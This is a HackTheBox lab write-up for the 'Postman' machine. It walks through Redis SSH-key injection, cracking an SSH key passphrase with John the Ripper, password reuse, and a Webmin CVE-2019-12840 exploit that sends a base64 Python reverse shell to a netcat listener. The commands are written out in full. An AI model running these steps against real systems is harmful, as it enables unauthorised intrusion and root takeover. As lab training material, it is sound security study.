---
layout: post
title: "HackTheBox Writeup: Postman"
thumbnail: "/assets/images/postman-htb/05d63fd8885d4e1612978a78c7138440_MD5.jpg"
---

In this post, we tackle the **Postman** machine on HackTheBox. The attack path begins with an exposed and unauthenticated Redis service, which we exploit to write our own SSH public key directly into a user's `authorized_keys` file. After securing a foothold, we discover an encrypted SSH key backup, crack its passphrase, and pivot to a secondary user. Finally, we reuse those credentials to log into Webmin and exploit a known Remote Code Execution vulnerability (CVE-2019-12840) to achieve root.

---

## 1. Enumeration

We start our reconnaissance with a standard `nmap` scan.

```bash
┌──(mracherr㉿kali)-[~]
└─$ nmap -sC -sV 10.129.2.1
Starting Nmap 7.99 ( [https://nmap.org](https://nmap.org) ) at 2026-09-26 16:05 +0200
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Cyber Geek's Personal Website
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
```

![Website Overview](/assets/images/postman-htb/c9faeaa9f77bee81a8034a83531b22cd_MD5.jpg)
![Webmin Portal](/assets/images/postman-htb/d411b22eab73848470afd6d6593b6054_MD5.jpg)

Standard ports are open, but a full-port scan (`-p-`) reveals an additional, critical service hiding on port `6379`:

```bash
┌──(mracherr㉿kali)-[~]
└─$ nmap -p- 10.129.2.1 -T5
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
6379/tcp  open  redis
10000/tcp open  snet-sensor-mgmt
```

---

## 2. Initial Access: Redis SSH Key Injection

Port `6379` hosts a Redis server (version 4.0.9). Using a Metasploit auxiliary scanner, we confirm that the Redis instance is unauthenticated and allows anonymous interaction. 

A well-known misconfiguration in Redis allows an attacker to write files to the host filesystem. If the Redis service is running as a user who has an `.ssh` directory, we can trick Redis into saving our SSH public key directly into their `authorized_keys` file.

First, we generate a new SSH keypair on our attacker machine:

```bash
┌──(mracherr㉿kali)-[~]
└─$ ssh-keygen -t rsa -f redis_key
```

Next, we pad our public key with newlines so it isn't corrupted by other Redis database data, and save it to `key.txt`:

```bash
┌──(mracherr㉿kali)-[~]
└─$ (echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > key.txt
```

Now, we flush the Redis database and push our public key into memory:

```bash
┌──(mracherr㉿kali)-[~]
└─$ redis-cli -h 10.129.2.1 flushall
OK
┌──(mracherr㉿kali)-[~]
└─$ cat key.txt | redis-cli -h 10.129.2.1 -x set ssh_key
OK
```

Finally, we change the Redis working directory to the `redis` user's `.ssh` folder, configure the database filename to `authorized_keys`, and trigger a database save:

```bash
┌──(mracherr㉿kali)-[~]
└─$ redis-cli -h 10.129.2.1 config set dir /var/lib/redis/.ssh
OK
┌──(mracherr㉿kali)-[~]
└─$ redis-cli -h 10.129.2.1 config set dbfilename authorized_keys
OK
┌──(mracherr㉿kali)-[~]
└─$ redis-cli -h 10.129.2.1 save
OK
```

With our key injected, we successfully SSH into the machine as the `redis` user!

```bash
┌──(mracherr㉿kali)-[~]
└─$ ssh -i redis_key redis@10.129.2.1
redis@Postman:~$
```

---

## 3. Lateral Movement: Cracking SSH Keys

As the `redis` user, we enumerate the file system and find an interesting backup file in the `/opt` directory:

```bash
redis@Postman:~$ ls /opt
id_rsa.bak
```

This is an encrypted SSH private key. We transfer it to our local machine to crack the passphrase. First, we convert the key into a format John The Ripper can understand using `ssh2john`:

```bash
┌──(mracherr㉿kali)-[~]
└─$ ssh2john id_rsa.bak > redis_hash
```

We run it against the `rockyou` wordlist and quickly crack the passphrase:

```bash
┌──(mracherr㉿kali)-[/usr/share/wordlists]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt ~/redis_hash
...
computer2008     (tmp_id)
```

The passphrase is **`computer2008`**. Checking the `/etc/passwd` file earlier revealed a user named **Matt**. We attempt to switch to his account (`su Matt`) using the cracked passphrase as his system password:

```bash
redis@Postman:/opt$ su Matt
Password:
Matt@Postman:/opt$ cat ~/user.txt
63f7c1f33ad75625c2b2a15fe41428ac
```

It works! We have achieved lateral movement and secured the user flag.

---

## 4. Privilege Escalation: Webmin RCE (CVE-2019-12840)

During our initial `nmap` scan, we noted that **Webmin 1.910** was running on port 10000. 

![Webmin Password Reuse](/assets/images/postman-htb/0846dccedd4c35638ee08b40d5cf3de5_MD5.jpg)

Researching this specific version reveals it is vulnerable to **CVE-2019-12840**, an Authenticated Remote Code Execution vulnerability via the Package Updates module.

Because users heavily reuse passwords across systems, we attempt to log into the Webmin portal on port 10000 using Matt's credentials (`Matt`:`computer2008`). It accepts the login!

We grab a Python PoC script for the CVE and launch the exploit, passing in Matt's credentials and our local listener details:

```bash
┌──(mracherr㉿kali)-[~/tmp_labs/postname/webmin_cve-2019-12840_poc]
└─$ python CVE-2019-12840.py -u [https://10.129.2.1](https://10.129.2.1) -U Matt -P computer2008 -lport 4443 -lhost 10.10.17.244            

             Webmin <= 1.910 RCE (Authorization Required)
                           by KrE80r

[*] logging in ...
[+] got sid 1e4e97c28a3535b023881275e28d90d3
[*] sending command python -c "import base64;exec(base64.b64decode('aW1wb...
```

The script successfully authenticates, grabs a session ID, and injects a base64-encoded Python reverse shell payload. We check our netcat listener:

```bash
┌──(mracherr㉿kali)-[~]
└─$ nc -nlvp 4443
listening on [any] 4443 ...
connect to [10.10.17.244] from (UNKNOWN) [10.129.2.1] 60322
# whoami
root
# cat /root/root.txt
afdd62130460fb2ce7f3f66725bdbac2
```

![Root Shell Caught](/assets/images/postman-htb/05d63fd8885d4e1612978a78c7138440_MD5.jpg)

Box completely compromised!